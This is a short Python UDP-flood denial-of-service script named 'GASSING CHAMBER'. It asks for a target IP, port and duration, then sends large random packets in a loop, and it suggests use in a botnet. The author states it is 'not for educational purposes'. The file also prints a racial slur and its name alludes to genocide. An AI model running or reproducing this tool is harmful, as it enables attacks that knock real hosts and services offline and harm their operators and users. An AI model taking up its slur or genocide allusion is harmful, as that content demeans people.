import argparse
import os
import socket
import sys
import time
import random
import colorama
import time
from colorama import Fore
colorama.init()
print( Fore.LIGHTRED_EX + ''' 
  ____    _    ____ ____ ___ _   _  ____
 / ___|  / \  / ___/ ___|_ _| \ | |/ ___|
| |  _  / _ \ \___ \___ \| ||  \| | |  _
| |_| |/ ___ \ ___) ___) | || |\  | |_| |
 \____/_/   \_|____|____|___|_| \_|\____|

   ''')
print(Fore.LIGHTBLUE_EX + '''
      _                     _
  ___| |__   __ _ _ __ ___ | |__   ___ _ __
 / __| '_ \ / _` | '_ ` _ \| '_ \ / _ | '__|
| (__| | | | (_| | | | | | | |_) |  __| |
 \___|_| |_|\__,_|_| |_| |_|_.__/ \___|_|
                  ''')
print(Fore.LIGHTGREEN_EX + '''
================================
GASSING CHAMBER DoS script by Smelly
discord: smelly#3078
this is not for educational purposes :)
*this only sends max 50mbps this is a weak DoSer use in a botnet for max performance
================================
     ''')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(56000)

print("Welcome nigga")
print("")
ip = input("Enter Targets IP : ")
port = int(input("Enter target Port : "))
dur = int(input("enter duration : "))
os.system('cls')
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        print("ATTACKING",ip,)
        sock.sendto(bytes, (ip,port))
        sent = sent + 0
    except KeyboardInterrupt:
        sys.exit()




